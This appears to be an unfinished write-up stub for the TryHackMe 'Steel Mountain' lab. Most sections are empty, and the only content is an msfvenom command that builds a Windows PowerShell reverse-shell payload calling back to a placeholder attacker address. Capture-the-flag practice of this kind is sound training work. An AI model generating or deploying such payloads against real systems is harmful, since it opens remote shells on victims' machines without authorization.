# Steel Mountain

{% embed url="https://tryhackme.com/room/steelmountain" %}

### Initial access

...

#### Retrieving shell (without metasploit)

{% code overflow="wrap" %}
```sh
$ msfvenom -p cmd/windows/powershell/powershell_reverse_tcp --platform windows LHOST=<attakcker_addr> LPORT=8888 -o rev_windows.cmd
```
{% endcode %}



### Privilege escalation

